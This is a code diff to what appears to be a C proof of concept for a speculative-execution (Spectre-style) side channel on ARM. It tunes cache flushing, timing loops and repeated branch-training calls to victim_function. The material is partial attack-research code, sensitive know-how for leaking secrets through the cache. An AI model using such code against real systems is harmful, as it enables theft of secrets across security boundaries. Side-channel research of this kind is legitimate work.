@@ -41,24 +41,23 @@ uint64_t fast, slow;
 //32 MB = 32 * 2^20 = 2 ^ 5 * 2^20 = 2^25
 
 //big_array has to be this size!
-static uint32_t big_array[33554432];
+static uint32_t big_array[33554432] __attribute__((aligned(128)));
 static uint32_t big_array2[33554432];
 static uint32_t big_array3[33554432];
 
-void flush_cache()
+void __attribute__((optnone)) flush_cache()
 {
   
   for (int i = 0; i < 33554432; i++)
   {
     big_array[i] = i;
-    big_array2[i] = i;
-    big_array3[i] = i;
   }
 }
 
 double __attribute__((optnone)) victim_function(register int secret, register int bit, int isPublic)
 {
-  for (volatile int i = 0; i < 200; i++);
+    memory_access(&global_variable);
+  for (volatile int i = 0; i < 1000; i++);
    memory_fence();
 
   if (isPublic < array[0x2 * STRIDE]) {
@@ -69,12 +68,12 @@ double __attribute__((optnone)) victim_function(register int secret, register in
     
     asm volatile (
         // "1: \n"  // Label for the loop start
-        ".rept 4000\n\t"  // Repeat the following instructions 47 times
+        ".rept 1\n\t"  // Repeat the following instructions 47 times
         "fsqrt d0, d0\n\t"  // Compute the square root of the double-precision value in d0
         "fmul d0, d0, d0\n\t"  // Multiply the value in d0 by itself
         ".endr\n\t"
     );
-    //*(volatile uint64_t*)&global_variable;
+    memory_access(&global_variable);
   }
   return 0;
 }
@@ -102,6 +101,10 @@ int main(int argc, char *argv[])
     memory_fence();
 
     //Train victim function
+    victim_function(0,0,0);
+    victim_function(0,0,0);
+    victim_function(0,0,0);
+    victim_function(0,0,0);
     victim_function(0,0,0);
     victim_function(0,0,0);
 
